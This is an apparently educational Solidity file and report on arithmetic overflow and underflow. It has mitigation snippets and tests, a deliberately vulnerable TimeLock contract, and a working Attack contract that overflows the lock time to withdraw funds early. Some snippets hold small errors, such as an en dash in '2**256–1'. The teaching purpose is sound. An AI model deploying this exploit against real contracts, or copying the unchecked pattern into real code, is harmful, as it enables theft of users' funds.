/*
🔍 Understanding Arithmetic Overflow and Underflow
Arithmetic overflow and underflow are common issues in programming, including Solidity smart contracts. They occur when calculations exceed the limits of the data type being used. Let’s take a quick look at what each term means:

- Arithmetic Overflow: This happens when the result of an arithmetic operation is too large to be stored within the variable’s data type. For example, if you add two large numbers that result in a value beyond the maximum limit of an `uint256`, an overflow occurs.

- Arithmetic Underflow: Conversely, underflow occurs when the result of an arithmetic operation is too small to be represented by the data type. For instance, subtracting a larger value from a smaller one might result in underflow.

💥 Risks of Ignoring Overflow and Underflow
Failing to handle arithmetic overflow and underflow can have serious consequences for your smart contracts. It can lead to incorrect calculations, unexpected behavior, and even create vulnerabilities that attackers could exploit. Some potential risks include:

1. Financial Loss: In financial applications like token transfers, mishandling overflow or underflow could result in unintended transfers of funds, causing financial losses to users.

2. Exploitation: Malicious actors could intentionally trigger overflow or underflow to manipulate contract behavior in their favor, leading to unfair advantages or theft.

3. Data Corruption: Overflow or underflow might corrupt critical data, affecting the overall integrity of your contract’s state.

4. Contract Halting: In some cases, an unhandled overflow or underflow might cause the contract to halt unexpectedly, disrupting its normal operations.
*/

/*
🔐 Mitigating Arithmetic Overflow and Underflow
To ensure the security and reliability of your Solidity smart contracts, it’s imperative to implement strategies that prevent and handle arithmetic overflow and underflow. Let’s explore some best practices and techniques:

1. Choose Appropriate Data Types: Carefully select the appropriate data type for your variables. Solidity provides various integer types (`uint8`, `uint256`, `int8`, `int256`, etc.). Choose the one that fits your requirements without unnecessarily large ranges.

2. SafeMath Library: Solidity’s SafeMath library offers safe arithmetic operations that automatically check for overflow and underflow before performing calculations. This prevents vulnerabilities by reverting transactions when such issues are detected.

// Import SafeMath library
 import "@openzeppelin/contracts/utils/math/SafeMath.sol";
 
 contract SafeMathExample {
 using SafeMath for uint256;
 
 uint256 public balance;
 
 function addToBalance(uint256 _amount) public {
 balance = balance.add(_amount);
 }
 }
3. Explicit Checking: Manually check for overflow and underflow conditions before performing arithmetic operations. This involves verifying whether the result of the operation is within the valid range for the data type.

contract ExplicitCheckingExample {
 uint256 public maxUInt256 = 2**256–1;
 
 function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {
 require(a <= maxUInt256 - b, "Overflow detected");
 return a + b;
 }
 }
4. Limit User Inputs: Implement input validation to ensure that user-provided values won’t trigger overflow or underflow. Use modifiers or require statements to enforce these limits.

5. Upgradeable Contracts: Consider designing your contracts with upgradability in mind. This way, if a vulnerability related to overflow or underflow is discovered, you can patch it without disrupting the entire system.

🧪 Testing for Arithmetic Overflow and Underflow
Writing tests is a crucial aspect of ensuring your smart contracts are secure and functional. Let’s explore how to write tests specifically targeting arithmetic overflow and underflow scenarios:

1. Truffle Testing: Truffle is a popular development and testing framework for Ethereum smart contracts. It provides a robust testing environment where you can create test cases that simulate different scenarios, including overflow and underflow.

const SafeMathExample = artifacts.require("SafeMathExample");
 
 contract("SafeMathExample", accounts => {
 it("should prevent overflow", async () => {
 const instance = await SafeMathExample.deployed();
 const initialValue = await instance.balance();
 const amountToAdd = 2**256 - initialValue; // This will cause overflow
 
 try {
 await instance.addToBalance(amountToAdd);
 } catch (error) {
 assert(error.message.includes("SafeMath: addition overflow"));
 }
 });
 });
2. Hardhat Testing: Hardhat is another powerful tool for Ethereum development and testing. Similar to Truffle, you can write tests using Hardhat’s testing framework.

const { expect } = require("chai");
 
 describe("ExplicitCheckingExample", function () {
 it("should detect overflow", async function () {
 const ExplicitCheckingExample = await ethers.getContractFactory("ExplicitCheckingExample");
 const instance = await ExplicitCheckingExample.deploy();
 
 // Attempting to add values that will cause overflow
 await expect(instance.safeAdd(2**256–1, 1)).to.be.revertedWith("Overflow detected");
 });
 });
*/


//Smart Contract Vulnerability Report

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}


/*
Arithmetic overflow and underflow are critical vulnerabilities in Solidity smart contracts that can lead to unintended behavior and security breaches. These vulnerabilities are particularly pronounced in Solidity versions prior to 0.8. In this report, we analyze a vulnerable smart contract that demonstrates the risks associated with arithmetic overflow and underflow and propose preventative techniques to mitigate these risks.
*/

// Timelock contract

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
contract TimeLock {
 mapping(address => uint) public balances;
 mapping(address => uint) public lockTime;
function deposit() external payable {
 balances[msg.sender] += msg.value;
 lockTime[msg.sender] = block.timestamp + 1 weeks;
 }
function increaseLockTime(uint _secondsToIncrease) public {
 lockTime[msg.sender] += _secondsToIncrease;
 }
function withdraw() public {
 require(balances[msg.sender] > 0, "Insufficient funds");
 require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
uint amount = balances[msg.sender];
 balances[msg.sender] = 0;
(bool sent, ) = msg.sender.call{value: amount}("");
 require(sent, "Failed to send Ether");
 }
}


// Attack contract

contract Attack {
 TimeLock timeLock;
constructor(TimeLock _timeLock) {
 timeLock = TimeLock(_timeLock);
 }
fallback() external payable {}
function attack() public payable {
 timeLock.deposit{value: msg.value}();
// Triggering arithmetic overflow
 timeLock.increaseLockTime(
 type(uint).max + 1 - timeLock.lockTime(address(this))
 );
 timeLock.withdraw();
 }
}


/*
Vulnerability Exploitation

The Attack contract exploits the arithmetic overflow vulnerability present in the TimeLock contract. By manipulating the `increaseLockTime` function, the attacker can set the lock time to a negative value, effectively allowing them to withdraw funds without adhering to the waiting period.

Preventative Techniques

1. SafeMath Library: To prevent arithmetic overflow and underflow vulnerabilities, it’s recommended to use the SafeMath library. This library provides safe arithmetic operations that automatically check for overflow and underflow conditions before performing calculations. By using SafeMath, you can ensure that calculations stay within the valid range of the data type.

2. Solidity Version >= 0.8: Solidity version 0.8 and above have improved default behavior for overflow and underflow. Instead of silently wrapping around or producing unexpected results, Solidity 0.8 throws errors when overflow or underflow occurs. This significantly reduces the risk of unintentional vulnerabilities related to these issues.

In Conclusion; Arithmetic overflow and underflow vulnerabilities pose significant risks to the security and integrity of Solidity smart contracts. The provided vulnerable smart contract example highlights the importance of properly handling arithmetic operations to prevent malicious actors from exploiting these vulnerabilities. Utilizing preventative techniques such as the SafeMath library and adopting Solidity versions 0.8 and above can greatly enhance the security of your smart contracts and protect them from these types of vulnerabilities. It’s crucial to stay updated with the latest best practices and developments in Solidity to ensure the resilience and trustworthiness of your contracts.
*/